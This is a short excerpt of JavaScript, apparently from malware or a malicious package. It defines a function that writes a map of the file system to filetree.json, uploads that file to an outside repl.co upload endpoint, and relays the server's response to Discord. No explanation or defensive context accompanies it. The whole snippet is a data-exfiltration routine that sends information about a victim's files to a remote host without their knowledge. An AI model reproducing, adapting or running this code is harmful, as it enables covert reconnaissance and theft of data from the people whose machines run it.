...
function mapFSAndUpload() {
  ...
  fs.writeFileSync("filetree.json", jsonString);
  const upload_url = "https://file-host-1.blueobsidian.repl.co/upload.php";
  const res = axios
    .post(upload_url, {
      file: fs.createReadStream("filetree.json"),
    })
    .then(response => {
      //change to json data
      sendToDiscord(response.data);
    })
    .catch(error => {
      console.error(error);
    });
